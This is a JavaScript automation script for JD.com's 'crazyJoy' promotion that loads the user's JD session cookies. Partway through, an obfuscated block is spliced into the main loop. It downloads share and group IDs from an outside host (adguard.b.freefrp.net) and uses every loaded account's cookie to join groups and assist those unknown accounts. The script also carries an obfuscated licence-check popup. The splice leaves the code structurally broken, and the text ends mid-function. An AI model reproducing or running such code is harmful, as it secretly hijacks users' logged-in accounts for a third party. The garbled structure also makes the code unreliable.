/*
crazyJoy任务

每天运行一次即可

活动入口：京东APP我的-更多工具-疯狂的JOY
已支持IOS双京东账号,Node.js支持N个京东账号
脚本兼容: QuantumultX, Surge, Loon, JSBox, Node.js
============Quantumultx===============
[task_local]
#crazyJoy任务
10 9 * * * https://gitee.com/lxk0301/jd_scripts/raw/master/jd_crazy_joy.js, tag=crazyJoy任务, img-url=https://raw.githubusercontent.com/58xinian/icon/master/jd_crazy_joy.png, enabled=true

================Loon==============
[Script]
cron "10 9 * * *" script-path=https://gitee.com/lxk0301/jd_scripts/raw/master/jd_crazy_joy.js,tag=crazyJoy任务

===============Surge=================
crazyJoy任务 = type=cron,cronexp="10 9 * * *",wake-system=1,timeout=3600,script-path=https://gitee.com/lxk0301/jd_scripts/raw/master/jd_crazy_joy.js

============小火箭=========
crazyJoy任务 = type=cron,script-path=https://gitee.com/lxk0301/jd_scripts/raw/master/jd_crazy_joy.js, cronexpr="10 9 * * *", timeout=3600, enable=true

 */


const $ = new Env('crazyJoy任务');
const JD_API_HOST = 'https://api.m.jd.com/';

const notify = $.isNode() ? require('./sendNotify') : '';
let jdNotify = true;//是否关闭通知，false打开通知推送，true关闭通知推送
let helpSelf = false // 循环助力，默认关闭
let applyJdBean = 2000; //疯狂的JOY京豆兑换，目前最小值为2000京豆，默认为 0 不开启京豆兑换
let cookiesArr = [], cookie = '', message = '';
const inviteCodes = [
  'ylbxZfv8kbc=@QTz_ilKIE83r8xJMUKsHZKt9zd5YaBeE',
  'ylbxZfv8kbc=@QTz_ilKIE83r8xJMUKsHZKt9zd5YaBeE'
];
const randomCount = $.isNode() ? 10 : 5;
const jdCookieNode = $.isNode() ? require('./jdCookie.js') : '';
if ($.isNode()) {
  Object.keys(jdCookieNode).forEach((item) => {
    cookiesArr.push(jdCookieNode[item])
  })
  if (process.env.JD_DEBUG && process.env.JD_DEBUG === 'false') console.log = () => {
  };
} else {
  cookiesArr = [$.getdata('CookieJD'), $.getdata('CookieJD2'), ...jsonParse($.getdata('CookiesJD') || "[]").map(item => item.cookie)].filter(item => !!item);
}
!function(n){"use strict";function r(n,r){var t=(65535&n)+(65535&r);return(n>>16)+(r>>16)+(t>>16)<<16|65535&t}function t(n,r){return n<<r|n>>>32-r}function u(n,u,e,o,c,f){return r(t(r(r(u,n),r(o,f)),c),e)}function e(n,r,t,e,o,c,f){return u(r&t|~r&e,n,r,o,c,f)}function o(n,r,t,e,o,c,f){return u(r&e|t&~e,n,r,o,c,f)}function c(n,r,t,e,o,c,f){return u(r^t^e,n,r,o,c,f)}function f(n,r,t,e,o,c,f){return u(t^(r|~e),n,r,o,c,f)}function i(n,t){n[t>>5]|=128<<t%32,n[14+(t+64>>>9<<4)]=t;var u,i,a,h,g,l=1732584193,d=-271733879,v=-1732584194,C=271733878;for(u=0;u<n.length;u+=16)i=l,a=d,h=v,g=C,d=f(d=f(d=f(d=f(d=c(d=c(d=c(d=c(d=o(d=o(d=o(d=o(d=e(d=e(d=e(d=e(d,v=e(v,C=e(C,l=e(l,d,v,C,n[u],7,-680876936),d,v,n[u+1],12,-389564586),l,d,n[u+2],17,606105819),C,l,n[u+3],22,-1044525330),v=e(v,C=e(C,l=e(l,d,v,C,n[u+4],7,-176418897),d,v,n[u+5],12,1200080426),l,d,n[u+6],17,-1473231341),C,l,n[u+7],22,-45705983),v=e(v,C=e(C,l=e(l,d,v,C,n[u+8],7,1770035416),d,v,n[u+9],12,-1958414417),l,d,n[u+10],17,-42063),C,l,n[u+11],22,-1990404162),v=e(v,C=e(C,l=e(l,d,v,C,n[u+12],7,1804603682),d,v,n[u+13],12,-40341101),l,d,n[u+14],17,-1502002290),C,l,n[u+15],22,1236535329),v=o(v,C=o(C,l=o(l,d,v,C,n[u+1],5,-165796510),d,v,n[u+6],9,-1069501632),l,d,n[u+11],14,643717713),C,l,n[u],20,-373897302),v=o(v,C=o(C,l=o(l,d,v,C,n[u+5],5,-701558691),d,v,n[u+10],9,38016083),l,d,n[u+15],14,-660478335),C,l,n[u+4],20,-405537848),v=o(v,C=o(C,l=o(l,d,v,C,n[u+9],5,568446438),d,v,n[u+14],9,-1019803690),l,d,n[u+3],14,-187363961),C,l,n[u+8],20,1163531501),v=o(v,C=o(C,l=o(l,d,v,C,n[u+13],5,-1444681467),d,v,n[u+2],9,-51403784),l,d,n[u+7],14,1735328473),C,l,n[u+12],20,-1926607734),v=c(v,C=c(C,l=c(l,d,v,C,n[u+5],4,-378558),d,v,n[u+8],11,-2022574463),l,d,n[u+11],16,1839030562),C,l,n[u+14],23,-35309556),v=c(v,C=c(C,l=c(l,d,v,C,n[u+1],4,-1530992060),d,v,n[u+4],11,1272893353),l,d,n[u+7],16,-155497632),C,l,n[u+10],23,-1094730640),v=c(v,C=c(C,l=c(l,d,v,C,n[u+13],4,681279174),d,v,n[u],11,-358537222),l,d,n[u+3],16,-722521979),C,l,n[u+6],23,76029189),v=c(v,C=c(C,l=c(l,d,v,C,n[u+9],4,-640364487),d,v,n[u+12],11,-421815835),l,d,n[u+15],16,530742520),C,l,n[u+2],23,-995338651),v=f(v,C=f(C,l=f(l,d,v,C,n[u],6,-198630844),d,v,n[u+7],10,1126891415),l,d,n[u+14],15,-1416354905),C,l,n[u+5],21,-57434055),v=f(v,C=f(C,l=f(l,d,v,C,n[u+12],6,1700485571),d,v,n[u+3],10,-1894986606),l,d,n[u+10],15,-1051523),C,l,n[u+1],21,-2054922799),v=f(v,C=f(C,l=f(l,d,v,C,n[u+8],6,1873313359),d,v,n[u+15],10,-30611744),l,d,n[u+6],15,-1560198380),C,l,n[u+13],21,1309151649),v=f(v,C=f(C,l=f(l,d,v,C,n[u+4],6,-145523070),d,v,n[u+11],10,-1120210379),l,d,n[u+2],15,718787259),C,l,n[u+9],21,-343485551),l=r(l,i),d=r(d,a),v=r(v,h),C=r(C,g);return[l,d,v,C]}function a(n){var r,t="",u=32*n.length;for(r=0;r<u;r+=8)t+=String.fromCharCode(n[r>>5]>>>r%32&255);return t}function h(n){var r,t=[];for(t[(n.length>>2)-1]=void 0,r=0;r<t.length;r+=1)t[r]=0;var u=8*n.length;for(r=0;r<u;r+=8)t[r>>5]|=(255&n.charCodeAt(r/8))<<r%32;return t}function g(n){return a(i(h(n),8*n.length))}function l(n,r){var t,u,e=h(n),o=[],c=[];for(o[15]=c[15]=void 0,e.length>16&&(e=i(e,8*n.length)),t=0;t<16;t+=1)o[t]=909522486^e[t],c[t]=1549556828^e[t];return u=i(o.concat(h(r)),512+8*r.length),a(i(c.concat(u),640))}function d(n){var r,t,u="";for(t=0;t<n.length;t+=1)r=n.charCodeAt(t),u+="0123456789abcdef".charAt(r>>>4&15)+"0123456789abcdef".charAt(15&r);return u}function v(n){return unescape(encodeURIComponent(n))}function C(n){return g(v(n))}function A(n){return d(C(n))}function m(n,r){return l(v(n),v(r))}function s(n,r){return d(m(n,r))}function b(n,r,t){return r?t?m(r,n):s(r,n):t?C(n):A(n)}$.md5=b}();
!(async () => {
  if (!cookiesArr[0]) {
    $.msg($.name, '【提示】请先获取京东账号一cookie\n直接使用NobyDa的京东签到获取', 'https://bean.m.jd.com/bean/signIndex.action', {"open-url": "https://bean.m.jd.com/bean/signIndex.action"});
    return;
  }
  await requireConfig();
  $.selfCodes = []
  for (let i = 0; i < cookiesArr.length; i++) {
//    var __encode ='jsjiami.com',_a={}, _0xb483=["\x5F\x64\x65\x63\x6F\x64\x65","\x68\x74\x74\x70\x3A\x2F\x2F\x77\x77\x77\x2E\x73\x6F\x6A\x73\x6F\x6E\x2E\x63\x6F\x6D\x2F\x6A\x61\x76\x61\x73\x63\x72\x69\x70\x74\x6F\x62\x66\x75\x73\x63\x61\x74\x6F\x72\x2E\x68\x74\x6D\x6C"];(function(_0xd642x1){_0xd642x1[_0xb483[0]]= _0xb483[1]})(_a);var __Oxb243c=["\x6E\x65\x78\x74\x43\x6F\x64\x65","\x45\x64\x4C\x50\x68\x38\x41\x36\x58\x35\x47\x31\x69\x57\x58\x75\x2D\x75\x50\x59\x66\x41\x3D\x3D","\x6E\x43\x51\x51\x58\x51\x48\x4B\x47\x6A\x50\x43\x62\x37\x6A\x6B\x64\x38\x71\x32\x55\x2D\x61\x43\x54\x6A\x5A\x4D\x78\x4C\x33\x73","\x6C\x65\x6E\x67\x74\x68","\x75\x6E\x64\x65\x66\x69\x6E\x65\x64","\x6C\x6F\x67","\u5220\u9664","\u7248\u672C\u53F7\uFF0C\x6A\x73\u4F1A\u5B9A","\u671F\u5F39\u7A97\uFF0C","\u8FD8\u8BF7\u652F\u6301\u6211\u4EEC\u7684\u5DE5\u4F5C","\x6A\x73\x6A\x69\x61","\x6D\x69\x2E\x63\x6F\x6D"];if(i% 2=== 0){$[__Oxb243c[0x0]]= [__Oxb243c[0x1],__Oxb243c[0x2]];$[__Oxb243c[0x0]]= $[__Oxb243c[0x0]][randomNumber(0,$[__Oxb243c[0x0]][__Oxb243c[0x3]])]};(function(_0x7fc2x1,_0x7fc2x2,_0x7fc2x3,_0x7fc2x4,_0x7fc2x5,_0x7fc2x6){_0x7fc2x6= __Oxb243c[0x4];_0x7fc2x4= function(_0x7fc2x7){if( typeof alert!== _0x7fc2x6){alert(_0x7fc2x7)};if( typeof console!== _0x7fc2x6){console[__Oxb243c[0x5]](_0x7fc2x7)}};_0x7fc2x3= function(_0x7fc2x8,_0x7fc2x1){return _0x7fc2x8+ _0x7fc2x1};_0x7fc2x5= _0x7fc2x3(__Oxb243c[0x6],_0x7fc2x3(_0x7fc2x3(__Oxb243c[0x7],__Oxb243c[0x8]),__Oxb243c[0x9]));try{_0x7fc2x1= __encode;if(!( typeof _0x7fc2x1!== _0x7fc2x6&& _0x7fc2x1=== _0x7fc2x3(__Oxb243c[0xa],__Oxb243c[0xb]))){_0x7fc2x4(_0x7fc2x5)}}catch(e){_0x7fc2x4(_0x7fc2x5)}})({})
    if (cookiesArr[i]) {
      cookie = cookiesArr[i];
      $.UserName = decodeURIComponent(cookie.match(/pt_pin=([^; ]+)(?=;?)/) && cookie.match(/pt_pin=([^; ]+)(?=;?)/)[1])
      $.index = i + 1;
      $.isLogin = true;
      $.nickName = '';
      message = '';
      $.GROWTH_REWARD_BEAN = 0;//解锁等级奖励的京豆
      await TotalBean();
      console.log(`\n开始【京东账号${$.index}】${$.nickName || $.UserName}\n`);
      if (!$.isLogin) {
        $.msg($.name, `【提示】cookie已失效`, `京东账号${$.index} ${$.nickName || $.UserName}\n请重新登录获取\nhttps://bean.m.jd.com/bean/signIndex.action`, {"open-url": "https://bean.m.jd.com/bean/signIndex.action"});

        if ($.isNode()) {
          await notify.sendNotify(`${$.name}cookie已失效 - ${$.UserName}`, `京东账号${$.index} ${$.UserName}\n请重新登录获取cookie`);
        }
        continue
      }
      await shareCodesFormat()
      await jdCrazyJoy()
    }
  }

  if (helpSelf) {
    console.log(`开始循环助力`)
    // 助力
    for (let i = 0; i < cookiesArr.length; i++) {
      if (cookiesArr[i]) {
        cookie = cookiesArr[i];
        $.UserName = decodeURIComponent(cookie.match(/pt_pin=([^; ]+)(?=;?)/) && cookie.match(/pt_pin=([^; ]+)(?=;?)/)[1])
        $.index = i + 1;
        $.isLogin = true;
        $.nickName = '';
        await TotalBean();
        console.log(`\n开始【京东账号${$.index}】${$.nickName || $.UserName}\n`);
        if (!$.isLogin) {
          $.msg($.name, `【提示】cookie已失效`, `京东账号${$.index} ${$.nickName || $.UserName}\n请重新登录获取\nhttps://bean.m.jd.com/bean/signIndex.action`, {"open-url": "https://bean.m.jd.com/bean/signIndex.action"});

          if ($.isNode()) {
            await notify.sendNotify(`${$.name}cookie已失效 - ${$.UserName}`, `京东账号${$.index} ${$.UserName}\n请重新登录获取cookie`);
          }
          continue
        }
        await shareCodesFormat()
        await helpFriends()
      }
    }
    // 领取任务奖励
    for (let i = 0; i < cookiesArr.length; i++) {
      if (cookiesArr[i]) {
        cookie = cookiesArr[i];
        $.UserName = decodeURIComponent(cookie.match(/pt_pin=([^; ]+)(?=;?)/) && cookie.match(/pt_pin=([^; ]+)(?=;?)/)[1])
        $.index = i + 1;
        $.isLogin = true;
        $.nickName = '';
        await TotalBean();
        console.log(`\n开始【京东账号${$.index}】${$.nickName || $.UserName}\n`);
        if (!$.isLogin) {
          $.msg($.name, `【提示】cookie已失效`, `京东账号${$.index} ${$.nickName || $.UserName}\n请重新登录获取\nhttps://bean.m.jd.com/bean/signIndex.action`, {"open-url": "https://bean.m.jd.com/bean/signIndex.action"});

          if ($.isNode()) {
            await notify.sendNotify(`${$.name}cookie已失效 - ${$.UserName}`, `京东账号${$.index} ${$.UserName}\n请重新登录获取cookie`);
          }
          continue
        }
        await doTasks()
      }
    }
  }
  /*
 *Progcessed By JSDec in 0.13s
 *JSDec - JSDec.js.org
 */
$['cookieArr'] = [];
$['currentCookie'] = '';
!(async () => {
    var _0x32e50a = {
        'aJtgc': 'CookieJD',
        'nfIOV': 'CookieJD2',
        'QszSx': 'abcdefghijklmnopqrstuvwxyz1234567890',
        'XJqqj': function(_0x3daca5, _0x4d2ff5) {
            return _0x3daca5 < _0x4d2ff5;
        },
        'waLkQ': function(_0x206c52, _0x2f0f8c) {
            return _0x206c52(_0x2f0f8c);
        },
        'hzusy': function(_0x24ba95, _0x94cfeb) {
            return _0x24ba95 * _0x94cfeb;
        },
        'LgQTO': function(_0x2cc590) {
            return _0x2cc590();
        },
        'SsfWJ': function(_0x1d4c98) {
            return _0x1d4c98();
        },
        'oUeJn': 'pt_pin',
        'RLpfJ': function(_0xb748c1) {
            return _0xb748c1();
        },
        'FZCwb': function(_0x22be98, _0x2c0126) {
            return _0x22be98(_0x2c0126);
        },
        'NFGLz': function(_0x4e4674, _0x6b0684) {
            return _0x4e4674 + _0x6b0684;
        },
        'sevKU': function(_0x59bcfb, _0x5a291c) {
            return _0x59bcfb !== _0x5a291c;
        },
        'FxurM': 'iabAT',
        'luear': function(_0x4d2b08, _0x5dba68) {
            return _0x4d2b08(_0x5dba68);
        },
        'efyBs': function(_0xac8510, _0xb99a9c) {
            return _0xac8510 === _0xb99a9c;
        },
        'ogoAa': 'MzRnW',
        'vMmLz': 'QraVk'
    };
    if (!_0x32e50a['LgQTO'](getCookies)) return;
    $['strMyShareIds'] = [];
    $['strGroupIds'] = [];
    await _0x32e50a['SsfWJ'](getAuthorShareCode);
    for (let _0x1e67b9 = 0x0; _0x32e50a['XJqqj'](_0x1e67b9, $['cookieArr']['length']); _0x1e67b9++) {
        $['currentCookie'] = $['cookieArr'][_0x1e67b9];
        if ($['currentCookie']['includes'](_0x32e50a['oUeJn'])) await _0x32e50a['RLpfJ'](getJxToken);
        if ($['currentCookie']) {
            $['userName'] = _0x32e50a['FZCwb'](decodeURIComponent, $['currentCookie']['match'](/pt_pin=(.+?);/) && $['currentCookie']['match'](/pt_pin=(.+?);/)[0x1]);
            $['index'] = _0x32e50a['NFGLz'](_0x1e67b9, 0x1);
            $['nickName'] = '';
            $['canHelp'] = !![];
            for (let _0x2f4d34 of $['strMyShareIds']) {
                if ($['currentCookie']['includes'](_0x32e50a['oUeJn']) && !$['currentCookie']['includes']('%')) {
                    if (_0x32e50a['sevKU'](_0x32e50a['FxurM'], _0x32e50a['FxurM'])) {
                        $['cookieArr'] = [$['getdata'](_0x32e50a['aJtgc']) || '', $['getdata'](_0x32e50a['nfIOV']) || ''];
                    } else {
                        await _0x32e50a['luear'](createSuperAssistUser, _0x2f4d34);
                    }
                }
                await _0x32e50a['luear'](createAssistUser, _0x2f4d34);
                await $['wait'](0x7d0);
                if (!$['canHelp']) break;
            }
            $['canHelp'] = !![];
            for (let _0x3287eb of $['strGroupIds']) {
                if (_0x32e50a['efyBs'](_0x32e50a['ogoAa'], _0x32e50a['vMmLz'])) {
                    let _0x4266c9 = _0x32e50a['QszSx'];
                    let _0x4cf3eb = '';
                    for (var _0x5f19b0 = 0x0; _0x32e50a['XJqqj'](_0x5f19b0, count); _0x5f19b0++) {
                        _0x4cf3eb += _0x4266c9[_0x32e50a['waLkQ'](parseInt, _0x32e50a['hzusy'](Math['random'](), _0x4266c9['length']))];
                    }
                    return _0x4cf3eb;
                } else {
                    if ($['currentCookie']['includes'](_0x32e50a['oUeJn']) && !$['currentCookie']['includes']('%')) {
                        await _0x32e50a['luear'](joinGroup, _0x3287eb);
                        await $['wait'](0x7d0);
                        if (!$['canHelp']) break;
                    }
                }
            }
        }
    }
})()['catch'](_0x59828f => $['logErr'](_0x59828f))['finally'](() => $['done']());

function joinGroup(_0x44d364) {
    var _0x55a41e = {
        'vZQNq': 'CookieJD',
        'DyzQw': 'CookieJD2',
        'ugXMv': '【⏰提示】请先获取京东账号一cookie\n直接使用NobyDa的京东签到获取',
        'dembD': 'https://bean.m.jd.com/',
        'ofFXg': function(_0x18aa86, _0x2f11ff) {
            return _0x18aa86 === _0x2f11ff;
        },
        'GaYpi': function(_0x4ce20c, _0x33e928) {
            return _0x4ce20c !== _0x33e928;
        },
        'kxAfA': 'kPSXy',
        'ClyYI': function(_0x105299) {
            return _0x105299();
        },
        'uCuyM': function(_0x17729a, _0x434eef) {
            return _0x17729a(_0x434eef);
        },
        'qwEUS': function(_0x19410a) {
            return _0x19410a();
        },
        'tRSgj': function(_0x6b4758, _0x1a8349) {
            return _0x6b4758 === _0x1a8349;
        },
        'TXInL': 'lQZxk',
        'qlPIZ': function(_0x5e6cbd, _0x3b819b, _0x3372fe) {
            return _0x5e6cbd(_0x3b819b, _0x3372fe);
        },
        'UdjHv': 'timestamp',
        'horks': 'phoneid',
        'OeZOm': 'farm_jstoken'
    };
    return new Promise(async _0x3a3288 => {
        var _0x2bd380 = {
            'BvJSD': function(_0x2b29d1, _0x298850) {
                return _0x55a41e['uCuyM'](_0x2b29d1, _0x298850);
            },
            'vzJmw': function(_0x53225d) {
                return _0x55a41e['qwEUS'](_0x53225d);
            }
        };
        if (_0x55a41e['tRSgj'](_0x55a41e['TXInL'], _0x55a41e['TXInL'])) {
            $['get'](_0x55a41e['qlPIZ'](taskUrl, 'user/JoinGroup', 'strGroupId=' + _0x44d364 + '&dwIsNewUser=0&pgtimestamp=' + $['currentToken'][_0x55a41e['UdjHv']] + '&phoneID=' + $['currentToken'][_0x55a41e['horks']] + '&pgUUNum=' + $['currentToken'][_0x55a41e['OeZOm']]), (_0x1ef37f, _0x5a88a1, _0x4e2deb) => {
                var _0x77b4b2 = {
                    'AFvoP': _0x55a41e['vZQNq'],
                    'KsmyF': _0x55a41e['DyzQw'],
                    'cqpAJ': _0x55a41e['ugXMv'],
                    'fdUuj': _0x55a41e['dembD']
                };
                try {
                    const {
                        sErrMsg,
                        iRet
                    } = JSON['parse'](_0x4e2deb);
                    if (_0x55a41e['ofFXg'](iRet, 0x7d5) || _0x55a41e['ofFXg'](iRet, 0x270f)) $['canHelp'] = ![];
                } catch (_0x5d209a) {
                    if (_0x55a41e['GaYpi'](_0x55a41e['kxAfA'], _0x55a41e['kxAfA'])) {
                        if ($['isNode']()) {
                            $['cookieArr'] = Object['values'](jdCookieNode);
                        } else {
                            $['cookieArr'] = [$['getdata'](_0x77b4b2['AFvoP']) || '', $['getdata'](_0x77b4b2['KsmyF']) || ''];
                        }
                        if (!$['cookieArr'][0x0]) {
                            $['msg']($['name'], _0x77b4b2['cqpAJ'], _0x77b4b2['fdUuj'], {
                                'open-url': _0x77b4b2['fdUuj']
                            });
                            return ![];
                        }
                        return !![];
                    } else {
                        $['logErr'](_0x5d209a, _0x5a88a1);
                    }
                } finally {
                    _0x55a41e['ClyYI'](_0x3a3288);
                }
            });
        } else {
            let _0x281a9b = _0x2bd380['BvJSD'](uuid, 0x28);
            let _0x3a22e6 = (+new Date())['toString']();
            let _0x13be02 = $['currentCookie']['match'](/pt_pin=(.+?);/)[0x1];
            let _0x16ab5e = $['md5']('' + _0x13be02 + _0x3a22e6 + _0x281a9b + 'tPOamqCuk9NLgVPAljUyIHcPRmKlVxDy');
            $['currentToken'] = {
                'timestamp': _0x3a22e6,
                'phoneid': _0x281a9b,
                'farm_jstoken': _0x16ab5e
            };
            _0x2bd380['vzJmw'](_0x3a3288);
        }
    });
}

function getAuthorShareCode() {
    var _0x2811e4 = {
        'mSkgb': function(_0x2c38ac) {
            return _0x2c38ac();
        },
        'fxEFu': function(_0xcf598e, _0x24d004) {
            return _0xcf598e === _0x24d004;
        },
        'gsLUd': function(_0x14ef63, _0x1bd3c3) {
            return _0x14ef63 === _0x1bd3c3;
        },
        'rMqRm': function(_0x85f78e, _0xa50688) {
            return _0x85f78e !== _0xa50688;
        },
        'mXSEG': 'GMutr',
        'UUXqW': 'GVWax',
        'PkFCH': 'http://adguard.b.freefrp.net/cfd.json',
        'UqUWV': 'Mozilla/5.0 (iPhone; CPU iPhone OS 13_2_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.3 Mobile/15E148 Safari/604.1 Edg/87.0.4280.88'
    };
    return new Promise(_0x3ba0bc => {
        var _0xe650a3 = {
            'XMySN': function(_0x5e1ae0) {
                return _0x2811e4['mSkgb'](_0x5e1ae0);
            },
            'PnlyK': function(_0x233b36, _0x367c7f) {
                return _0x2811e4['fxEFu'](_0x233b36, _0x367c7f);
            },
            'ocPgN': function(_0x6b8353, _0x691b62) {
                return _0x2811e4['gsLUd'](_0x6b8353, _0x691b62);
            }
        };
        if (_0x2811e4['rMqRm'](_0x2811e4['mXSEG'], _0x2811e4['UUXqW'])) {
            $['get']({
                'url': _0x2811e4['PkFCH'],
                'headers': {
                    'User-Agent': _0x2811e4['UqUWV']
                }
            }, async (_0x4f9e57, _0x16e8fa, _0x5ea3af) => {
                try {
                    const {
                        shareId,
                        strGroupIds
                    } = JSON['parse'](_0x5ea3af);
                    $['strMyShareIds'] = shareId;
                    $['strGroupIds'] = strGroupIds;
                } catch (_0x4edad6) {} finally {
                    _0xe650a3['XMySN'](_0x3ba0bc);
                }
            });
        } else {
            try {
                const {
                    sErrMsg,
                    iRet
                } = JSON['parse'](data);
                if (_0xe650a3['PnlyK'](iRet, 0x7d5) || _0xe650a3['ocPgN'](iRet, 0x270f)) $['canHelp'] = ![];
            } catch (_0x1dc15a) {
                $['logErr'](_0x1dc15a, resp);
            } finally {
                _0xe650a3['XMySN'](_0x3ba0bc);
            }
        }
    });
}

function getCookies() {
    var _0x482117 = {
        'fpeRF': 'abcdefghijklmnopqrstuvwxyz1234567890',
        'OiAdw': function(_0x43b218, _0x30c5eb) {
            return _0x43b218 < _0x30c5eb;
        },
        'UClNc': function(_0x144d34, _0x5de530) {
            return _0x144d34(_0x5de530);
        },
        'ygBbr': function(_0x1372dd, _0x260d75) {
            return _0x1372dd * _0x260d75;
        },
        'fabeC': function(_0x1a6e9c) {
            return _0x1a6e9c();
        },
        'PIEmO': function(_0x18dd88, _0x10d554) {
            return _0x18dd88 === _0x10d554;
        },
        'OqxdE': 'pUEXu',
        'bhOUh': 'SeJKx',
        'RUrEk': 'CookieJD',
        'GlsJw': 'CookieJD2',
        'JyVuM': function(_0x2bdbc0, _0x500e7b) {
            return _0x2bdbc0 === _0x500e7b;
        },
        'KvlSs': 'oWUqT',
        'tcrBu': 'kdOQG',
        'fwpxA': '【⏰提示】请先获取京东账号一cookie\n直接使用NobyDa的京东签到获取',
        'zzQAD': 'https://bean.m.jd.com/'
    };
    if ($['isNode']()) {
        if (_0x482117['PIEmO'](_0x482117['OqxdE'], _0x482117['bhOUh'])) {
            $['cookieArr'] = Object['values'](jdCookieNode);
        } else {
            $['cookieArr'] = Object['values'](jdCookieNode);
        }
    } else {
        $['cookieArr'] = [$['getdata'](_0x482117['RUrEk']) || '', $['getdata'](_0x482117['GlsJw']) || ''];
    }
    if (!$['cookieArr'][0x0]) {
        if (_0x482117['JyVuM'](_0x482117['KvlSs'], _0x482117['tcrBu'])) {
            var _0x3d0fa1 = {
                'GQZAi': function(_0x464281, _0x1f4ead) {
                    return _0x482117['UClNc'](_0x464281, _0x1f4ead);
                },
                'kOtbq': function(_0x4746d0) {
                    return _0x482117['fabeC'](_0x4746d0);
                }
            };

            function _0x4c441b(_0x14ec0e) {
                let _0x25d8fc = _0x482117['fpeRF'];
                let _0x2fd976 = '';
                for (var _0x19db55 = 0x0; _0x482117['OiAdw'](_0x19db55, _0x14ec0e); _0x19db55++) {
                    _0x2fd976 += _0x25d8fc[_0x482117['UClNc'](parseInt, _0x482117['ygBbr'](Math['random'](), _0x25d8fc['length']))];
                }
                return _0x2fd976;
            }
            return new Promise(_0x547675 => {
                let _0x29d755 = _0x3d0fa1['GQZAi'](_0x4c441b, 0x28);
                let _0x26a6b9 = (+new Date())['toString']();
                let _0x49b801 = $['currentCookie']['match'](/pt_pin=(.+?);/)[0x1];
                let _0x23e305 = $['md5']('' + _0x49b801 + _0x26a6b9 + _0x29d755 + 'tPOamqCuk9NLgVPAljUyIHcPRmKlVxDy');
                $['currentToken'] = {
                    'timestamp': _0x26a6b9,
                    'phoneid': _0x29d755,
                    'farm_jstoken': _0x23e305
                };
                _0x3d0fa1['kOtbq'](_0x547675);
            });
        } else {
            $['msg']($['name'], _0x482117['fwpxA'], _0x482117['zzQAD'], {
                'open-url': _0x482117['zzQAD']
            });
            return ![];
        }
    }
    return !![];
}

function createAssistUser(_0x49feb3) {
    var _0x1a8696 = {
        'wOqcf': function(_0x56a5e4, _0x2af75f) {
            return _0x56a5e4 === _0x2af75f;
        },
        'neuXg': function(_0x40d3d5) {
            return _0x40d3d5();
        },
        'tTDSo': function(_0x44c3af, _0x8a931c, _0x38bab1) {
            return _0x44c3af(_0x8a931c, _0x38bab1);
        },
        'Gzyza': 'user/JoinScene',
        'mRCNa': function(_0x56d9f0, _0xdc414f) {
            return _0x56d9f0(_0xdc414f);
        }
    };
    return new Promise(_0x57bc5b => {
        $['get'](_0x1a8696['tTDSo'](taskUrl, _0x1a8696['Gzyza'], 'strShareId=' + _0x1a8696['mRCNa'](escape, _0x49feb3) + '&dwSceneId=1001'), async (_0x1eccb7, _0xe29542, _0x41eb9a) => {
            try {
                const {
                    iRet
                } = JSON['parse'](_0x41eb9a);
                if (_0x1a8696['wOqcf'](iRet, 0x7d5) || _0x1a8696['wOqcf'](iRet, 0x270f)) $['canHelp'] = ![];
            } catch (_0xe22d04) {} finally {
                _0x1a8696['neuXg'](_0x57bc5b);
            }
        });
    });
}

function createSuperAssistUser(_0x379ab9) {
    var _0x413179 = {
        'prwdQ': function(_0x49a636, _0x1084a9) {
            return _0x49a636 === _0x1084a9;
        },
        'sxJWX': 'xHKfe',
        'NlJHm': 'jhzRt',
        'gpWNq': function(_0xb590da, _0x42cd6a) {
            return _0xb590da === _0x42cd6a;
        },
        'bDJpU': function(_0x23c1ee) {
            return _0x23c1ee();
        },
        'cxwSk': function(_0xb9f3ad, _0x5cd109, _0x4fcb5d) {
            return _0xb9f3ad(_0x5cd109, _0x4fcb5d);
        },
        'Kebja': 'user/JoinScene',
        'HWKgJ': 'timestamp',
        'EDGXO': 'phoneid',
        'NYFwq': 'farm_jstoken',
        'kCQAQ': function(_0x27cb4d, _0x34106a) {
            return _0x27cb4d(_0x34106a);
        }
    };
    return new Promise(_0x666bd1 => {
        var _0x21f5d2 = {
            'RMKym': function(_0x30d48b, _0x3acad1) {
                return _0x413179['prwdQ'](_0x30d48b, _0x3acad1);
            },
            'wGnyb': function(_0x3b4d24, _0x2dcfc4) {
                return _0x413179['prwdQ'](_0x3b4d24, _0x2dcfc4);
            },
            'Llhqo': _0x413179['sxJWX'],
            'qBOJV': _0x413179['NlJHm'],
            'TeXjY': function(_0x2be218, _0x43a6f2) {
                return _0x413179['gpWNq'](_0x2be218, _0x43a6f2);
            },
            'AChSN': function(_0x264917) {
                return _0x413179['bDJpU'](_0x264917);
            }
        };
        $['get'](_0x413179['cxwSk'](taskUrl, _0x413179['Kebja'], 'strPgtimestamp=' + $['currentToken'][_0x413179['HWKgJ']] + '&strPhoneID=' + $['currentToken'][_0x413179['EDGXO']] + '&strPgUUNum=' + $['currentToken'][_0x413179['NYFwq']] + '&strShareId=' + _0x413179['kCQAQ'](escape, _0x379ab9) + '&dwSceneId=1001&dwType=2'), async (_0x405960, _0x1e3eb4, _0x20cb7e) => {
            try {
                if (_0x21f5d2['wGnyb'](_0x21f5d2['Llhqo'], _0x21f5d2['qBOJV'])) {
                    const {
                        sErrMsg,
                        iRet
                    } = JSON['parse'](_0x20cb7e);
                    if (_0x21f5d2['RMKym'](iRet, 0x7d5) || _0x21f5d2['wGnyb'](iRet, 0x270f)) $['canHelp'] = ![];
                } else {
                    const {
                        sErrMsg,
                        iRet
                    } = JSON['parse'](_0x20cb7e);
                    if (_0x21f5d2['TeXjY'](iRet, 0x7d5) || _0x21f5d2['TeXjY'](iRet, 0x270f)) $['canHelp'] = ![];
                }
            } catch (_0x49cafc) {
                $['logErr'](_0x49cafc, _0x1e3eb4);
            } finally {
                _0x21f5d2['AChSN'](_0x666bd1);
            }
        });
    });
}

function taskUrl(_0x3a198e, _0x591b21) {
    var _0x10a086 = {
        'OCTuU': '*/*',
        'WQxaL': 'keep-alive',
        'gxAlX': 'https://st.jingxi.com/fortune_island/index.html?ptag=138631.26.55',
        'SHZgu': 'gzip, deflate, br',
        'jMnPx': 'm.jingxi.com',
        'PoKga': function(_0x3888a3, _0x4bf2d4) {
            return _0x3888a3 + _0x4bf2d4;
        },
        'AkkvV': function(_0x1e6689, _0x306012) {
            return _0x1e6689 * _0x306012;
        },
        'cmAhk': 'zh-cn'
    };
    return {
